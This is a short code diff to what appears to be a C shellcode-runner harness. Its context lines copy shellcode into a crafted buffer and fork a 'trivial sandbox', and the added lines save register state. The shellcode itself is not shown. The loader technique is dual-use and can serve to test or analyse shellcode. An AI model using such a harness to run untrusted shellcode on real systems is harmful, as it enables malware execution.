@@ -86,6 +86,9 @@ int main(int argc, char **argv) {
   printf("[*] Copying shellcode into crafted buffer.\n");
   memcpy(pcall, shellcode, strlen(shellcode));
 
+  printf("[*] Saving register state..\n");
+  save_regs(&__serialize_regs(cregs));
+
   printf("[*] Creating trivial sandbox..\n");
 
   pid = fork();
